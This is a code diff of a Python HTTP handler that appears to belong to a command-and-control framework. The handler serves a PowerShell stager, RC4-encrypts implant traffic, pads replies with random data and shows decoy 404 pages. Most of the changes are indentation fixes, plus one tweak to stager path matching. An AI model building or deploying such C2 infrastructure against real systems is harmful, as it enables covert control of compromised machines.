@@ -41,7 +41,7 @@ def HTTPDFactory(config):
         def set_json_header(self):
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
-	    self.send_header("Access-Control-Allow-Origin", "*")
+            self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
 
         def do_POST(self):
@@ -78,15 +78,15 @@ def HTTPDFactory(config):
 
                 parser = HTTPDParser(config)
                 output = parser.parse_cmd(guid, data["Data"], data["UUID"])
-		if not output == None:
+                if not output == None:
                     uuid = output[:36]
                     output = output[37:]
                     self.output = base64.b64encode(self.rc4.crypt(output))
                     self.output = json.dumps({"UUID": uuid, "ID": guid, "Data": self.output})
-		else:
+                else:
                     self.output = json.dumps({"UUID": None, "ID": guid, "Data": Utils.gen_str(random.randrange(10, 1000))})
-		self.return_json()
-		return
+                self.return_json()
+                return
             else:
                 self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))
 
@@ -101,7 +101,8 @@ def HTTPDFactory(config):
                 return
 
             path = self.path.split("/")[-1]
-            if path == self.config.get("http-download-path"):
+            payload_path = self.path.split("/")
+            if payload_path[1] == self.config.get("http-download-path"):
                 Log.log_event("Download Stager", "PowerShell stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
                 self.output = Utils.load_powershell_script("stager.ps1", 56)
             elif path in Utils.get_download_folder_content():
@@ -115,11 +116,11 @@ def HTTPDFactory(config):
 
         def do_OPTIONS(self):
              self.send_response(200, "OK")
-	     self.send_header("Access-Control-Allow-Origin", "*")
+             self.send_header("Access-Control-Allow-Origin", "*")
              self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
              self.send_header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type, Authorization")
-	     self.output = "OK"
-	     self.return_json()
+             self.output = "OK"
+             self.return_json()
 
         def return_data(self, force_download = False):
             self.set_http_headers(force_download)
